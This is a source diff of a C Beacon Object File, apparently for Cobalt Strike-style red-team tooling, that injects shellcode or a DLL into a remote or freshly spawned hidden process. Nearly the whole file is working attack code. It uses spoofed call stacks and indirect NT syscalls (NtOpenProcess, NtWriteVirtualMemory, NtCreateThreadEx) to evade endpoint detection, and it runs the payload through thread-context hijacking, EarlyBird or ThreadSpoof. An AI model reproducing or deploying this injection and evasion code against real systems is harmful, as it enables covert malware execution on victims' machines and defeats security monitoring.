@@ -6,134 +6,201 @@
 #include "Ntdll.h"
 #include "Macros.h"
 #include "Bofdefs.h"
+#include "Syscalls.h"
 
-void go(char *args, int len) 
+void go(char *args, int len, BOOL x86) 
 {
+   	datap               parser;
+   	int                 pid = 0;
+   	int                 offset = 0;
+   	char *              dllPtr = NULL;
+   	int                 dllLen = 0;
 
-	datap parser;
-	DWORD procID;
-	SIZE_T shellcodeSize = NULL;
-	char *shellcode;
+#ifdef INJECT_EXPLICIT
+ /* Extract the arguments */
+   	BeaconDataParse(&parser, args, len);
+   	pid = BeaconDataInt(&parser);
+   	offset = BeaconDataInt(&parser);
+   	dllPtr = BeaconDataExtract(&parser, &dllLen);
 
-	BeaconDataParse(&parser, args, len);
-	procID = BeaconDataInt(&parser);
-	shellcode = BeaconDataExtract(&parser, &shellcodeSize);
+#elif defined(INJECT_SPAWN)
+    STARTUPINFOA        si;
+    PROCESS_INFORMATION pi;
+    short               ignoreToken;
 
-	BeaconPrintf(CALLBACK_OUTPUT, "Shellcode size: %d", shellcodeSize);
+	/* Extract the arguments */
+    BeaconDataParse(&parser, args, len);
+    ignoreToken = BeaconDataShort(&parser);
+    dllPtr = BeaconDataExtract(&parser, &dllLen);
+
+    /* zero out these data structures */
+    __stosb((void *)&si, 0, sizeof(STARTUPINFO));
+    __stosb((void *)&pi, 0, sizeof(PROCESS_INFORMATION));
+    
+	/* setup the other values in our startup info structure */
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    si.cb = sizeof(STARTUPINFO);
+    
+#endif
 
 	SYNTHETIC_STACK_FRAME   stackFrame = { 0 };
+	NT_FUNC					ntFunc		= { 0 };
+
+	if (!InitNtFunc(&ntFunc))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "[!] Fail to solve SSN !\n");
+		return;
+	}
+
 	if (!InitFrameInfo(&stackFrame))
 	{
-		BeaconPrintf(CALLBACK_OUTPUT,"[!] Fail to init stack frame !\n");
+		BeaconPrintf(CALLBACK_ERROR,"[!] Fail to init stack frame !\n");
+		return;
 	}
 
-	HMODULE hKernel32 = GetModuleHandleA("Kernel32.dll");
-	HMODULE hNtdll = GetModuleHandleA("Ntdll.dll");
+	CLIENT_ID cId = { 0 };
+	cId.UniqueProcess = (HANDLE)pid;
 
-	void* pOpenProcess 			= GetProcAddress(hKernel32, "OpenProcess");
-	void* pVirtualAllocEx 		= GetProcAddress(hKernel32, "VirtualAllocEx");
-	void* pWriteProcessMemory	= GetProcAddress(hKernel32, "WriteProcessMemory");	
-	void* pVirtualProtectEx		= GetProcAddress(hKernel32, "VirtualProtectEx");
-	void* pCreateRemoteThread	= GetProcAddress(hKernel32, "CreateRemoteThread");
-	void* pGetThreadContext		= GetProcAddress(hKernel32, "GetThreadContext");
-	void* pSetThreadContext		= GetProcAddress(hKernel32, "SetThreadContext");
-	void* pResumeThread			= GetProcAddress(hKernel32, "ResumeThread");
-	void* pLoadLibraryA 		= GetProcAddress(hKernel32, "LoadLibraryA");
+	OBJECT_ATTRIBUTES oa = { 0 };
+	InitializeObjectAttributes(&oa, 0, 0, 0, 0);
 
-	if (
-		!pOpenProcess 			||
-		!pVirtualAllocEx 		||
-		!pWriteProcessMemory 	||
-		!pVirtualProtectEx 		||
-		!pCreateRemoteThread 	||
-		!pGetThreadContext 		||
-		!pSetThreadContext 		||
-		!pResumeThread 			||
-		!pLoadLibraryA			
-		)
-	{
-		BeaconPrintf(CALLBACK_ERROR, "Error during solving addr of Kernel32 function !\nOpenProcess : %p\nVirtualAllocEx : %p\nWriteProcessMemory : %p\nVirtualProtectEx : %p\nCreateRemoteThread : %p\nGetThreadContext : %p\nSetThreadContext : %p\nResumeThread : %p\nLoadLibraryA : %p\n",
-					 pOpenProcess, pVirtualAllocEx, pWriteProcessMemory, pVirtualProtectEx, pCreateRemoteThread, pGetThreadContext, pSetThreadContext, pResumeThread, pLoadLibraryA);
-		return 0;
-	}
-
-	void* pRtlUserThreadStart	= GetProcAddress(hNtdll, "RtlUserThreadStart");
-	pRtlUserThreadStart 		+= 0x21;
-
-	void* pUser32 				= SPOOF_CALL(&stackFrame, pLoadLibraryA, (void*)"User32.dll");
-	void* pEnumDesktopsA		= GetProcAddress(pUser32, "EnumDesktopsA");
-
-	if(
-		!pRtlUserThreadStart ||
-		!pEnumDesktopsA
-	)
-	{
-		BeaconPrintf(CALLBACK_ERROR, "Error during solving addr of User32 and/or Ntdll !\nRtlUserThreadStart : %p\nEnumDesktopsA : %p\n", pRtlUserThreadStart, pEnumDesktopsA);
-		return 0;
-	}
-
-	HANDLE hProcess = SPOOF_CALL(&stackFrame, pOpenProcess, PROCESS_ALL_ACCESS, FALSE, procID);
-	if(hProcess == NULL)
-	{
-		BeaconPrintf(CALLBACK_ERROR, "Can't take HANDLE on remote process ! ERROR : %d", GetLastError());
-		return 0;
-	}
-
-	void* pAllocatedAddr = SPOOF_CALL(&stackFrame, pVirtualAllocEx, hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_READWRITE);
-	if(pAllocatedAddr == NULL)
-	{
-		BeaconPrintf(CALLBACK_ERROR, "Can't allocate memory on remote process ! ERROR : %d", GetLastError());
-		return 0;
-	}
-	BeaconPrintf(CALLBACK_OUTPUT, "Alocated addr : %p", pAllocatedAddr);
-
-	SIZE_T outWrite= 0;
-	if(!
-		SPOOF_CALL(&stackFrame, pWriteProcessMemory, hProcess, pAllocatedAddr, shellcode, shellcodeSize, &outWrite)
-	)
-	{
-		BeaconPrintf(CALLBACK_ERROR, "Error during WriteProcessMemory ! ERROR : %d", GetLastError());
-		return 0;
-	}
-
-	DWORD dwOldProtect = 0;
-	if(!
-		SPOOF_CALL(&stackFrame, pVirtualProtectEx, hProcess, pAllocatedAddr, shellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect)
-	)
-	{
-		BeaconPrintf(CALLBACK_ERROR, "Can't take change protection on remote process ! ERROR : %d", GetLastError());
-		return 0;
-	}
-
-	DWORD dwRemoteTid = 0;
-	HANDLE hThread = SPOOF_CALL(&stackFrame, pCreateRemoteThread, hProcess, NULL, 0, pRtlUserThreadStart, NULL, CREATE_SUSPENDED, &dwRemoteTid);
-	BeaconPrintf(CALLBACK_OUTPUT, "Remote TID : %d", dwRemoteTid);
-
-	CONTEXT ctx = { 0 };
-	ctx.ContextFlags = CONTEXT_ALL;
-
-	if(!
-	SPOOF_CALL(&stackFrame, pGetThreadContext, hThread, &ctx)
-	)
-	{
-		BeaconPrintf(CALLBACK_ERROR, "Can't take thread context ! ERROR : %d", GetLastError());
-		return 0;
-	}
-
-	ctx.Rip = (DWORD64)pEnumDesktopsA;
-	ctx.Rcx = 0;
-	ctx.Rdx = (DWORD64)pAllocatedAddr;
-
-
-	if(!
-	SPOOF_CALL(&stackFrame, pSetThreadContext, hThread, &ctx)
-	)
-	{
-		BeaconPrintf(CALLBACK_ERROR, "Can't set thread context ! ERROR : %d", GetLastError());
-		return 0;
-	}
-
-	SPOOF_CALL(&stackFrame, pResumeThread, hThread);
+	NTSTATUS status = 0;
+	HANDLE hProcess, hThread = NULL;
 	
-	BeaconPrintf(CALLBACK_OUTPUT, "Shellcode run with success !");
+		/* --------------------------------
+			Obtain HANDLE in process
+		-------------------------------- */
+
+#ifdef INJECT_SPAWN
+ 	/* Ready to go: spawn, inject and cleanup */
+    if (!BeaconSpawnTemporaryProcess(FALSE, ignoreToken, &si, &pi)) {
+        BeaconPrintf(CALLBACK_ERROR, "Unable to spawn %s temporary process.", x86 ? "x86" : "x64");
+        return;
+    }
+	else
+	{
+		BeaconPrintf(CALLBACK_OUTPUT, "Subprocess spawn with success !\n\tPID : %d\n\tTID : %d\n\thProcess : %p\n", pi.dwProcessId, pi.dwThreadId, pi.hProcess );
+	}
+
+    //BeaconPrintf(CALLBACK_OUTPUT, "Subprocess spawn with success !");
+    hProcess 	= pi.hProcess;
+	hThread		= pi.hThread;
+
+
+#else
+	status = SPOOF_CALL(&stackFrame, ntFunc.NtOpenProcess.pJmpAddr, ntFunc.NtOpenProcess.wSyscall, &hProcess, PROCESS_ALL_ACCESS, &oa, &cId);
+	if(NT_ERROR(status))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "[Main Error] 0x1 | NTSTATUS : 0x%llx", status);
+		goto cleanup;
+	}
+	BeaconPrintf(CALLBACK_OUTPUT, "Remote hProcess HANDLE : 0x%llx", hProcess);
+	
+	#endif
+	PVOID  pAllocatedAddr = NULL;
+	SIZE_T allocSize = dllLen;
+
+	// Failsafe, sometimes went wrong
+	for(int i = 0; i < 5; i++)
+	{
+		status = SPOOF_CALL(&stackFrame, ntFunc.NtAllocateVirtualMemory.pJmpAddr, ntFunc.NtAllocateVirtualMemory.wSyscall, hProcess, &pAllocatedAddr, 0, &allocSize,  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		if(NT_SUCCESS(status))
+		{
+			break;
+		}
+		else
+		{
+			if(status != 0xC00000BB) // STATUS_NOT_SUPPORTED sometimes went wront with this NT_STATUS
+			{
+				BeaconPrintf(CALLBACK_ERROR, "[Main Error] 0x2 | NTSTATUS : 0x%llx", status);
+				goto cleanup;
+			}
+		
+		}
+
+	}
+
+
+	/* --------------------------------
+		Write Shellcode
+	-------------------------------- */
+
+	SIZE_T writtenBytes = 0;
+	status = SPOOF_CALL(&stackFrame, ntFunc.NtWriteVirtualMemory.pJmpAddr, ntFunc.NtWriteVirtualMemory.wSyscall, hProcess, pAllocatedAddr, dllPtr, dllLen, &writtenBytes);
+	if(NT_ERROR(status))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "[Main Error] 0x3 | NTSTATUS :  0x%llx", status);
+		goto cleanup;
+	}
+
+		/* --------------------------------
+			Shellcode Injection
+		-------------------------------- */
+
+#ifdef INJECT_SPAWN
+
+#ifdef EARLYBIRD
+
+	if(!EarlyBird(pi.hThread, pi.hProcess, pAllocatedAddr, dllLen, offset, &stackFrame, &ntFunc))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Early bird fail !");
+		//goto cleanup;
+	}
+#elif defined(THREADSPOOF)
+	BeaconPrintf(CALLBACK_OUTPUT, "Execute shellcode with thread spoof !");
+
+	if(!ThreadSpoof(pi.hThread, pi.hProcess, pAllocatedAddr, dllLen, offset, &stackFrame, &ntFunc))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Thread spoof fail !");
+		//goto cleanup;
+	}
+
+#endif
+
+	
+#else	
+
+	BeaconPrintf(CALLBACK_OUTPUT, "Remote hProcess HANDLE : 0x%llx", hProcess);
+
+	UINT_PTR uiStartAddr = GetProcAddress(GetModuleHandleA("Ntdll.dll"), "RtlCreateUserThread");
+	uiStartAddr += 0x21;
+
+ 	status = SPOOF_CALL(&stackFrame, ntFunc.NtCreateThreadEx.pJmpAddr, ntFunc.NtCreateThreadEx.wSyscall, &hThread, NT_CREATE_THREAD_EX_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)uiStartAddr, NULL, NT_CREATE_THREAD_EX_SUSPENDED, NULL, NULL, NULL, NULL);
+	if(NT_ERROR(status))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "[Main Error] 0x4 | NTSTATUS :  0x%llx", status);
+
+		goto cleanup;
+	}
+
+#ifdef THREADSPOOF
+
+	if (!ThreadSpoof(hThread, hProcess, pAllocatedAddr, dllLen, offset, &stackFrame, &ntFunc))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Thread spoof fail !");
+		goto cleanup;
+	}
+#elif defined(EARLYBIRD)
+	BeaconPrintf(CALLBACK_OUTPUT, "Execute shellcode with early bird !");
+
+	if(!EarlyBird(hThread, hProcess, pAllocatedAddr, dllLen, offset, &stackFrame, &ntFunc))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Early bird fail !");
+		goto cleanup;
+	}
+
+#endif
+
+#endif
+	BeaconPrintf(CALLBACK_OUTPUT, "Injection success !");
+
+cleanup:
+	if(hProcess != NULL)
+		SPOOF_CALL(&stackFrame, ntFunc.NtClose.pJmpAddr, ntFunc.NtClose.wSyscall, hProcess, 0);
+
+	if(hThread != NULL)
+		SPOOF_CALL(&stackFrame, ntFunc.NtClose.pJmpAddr, ntFunc.NtClose.wSyscall, hThread, 0);
+
+	return;
 }
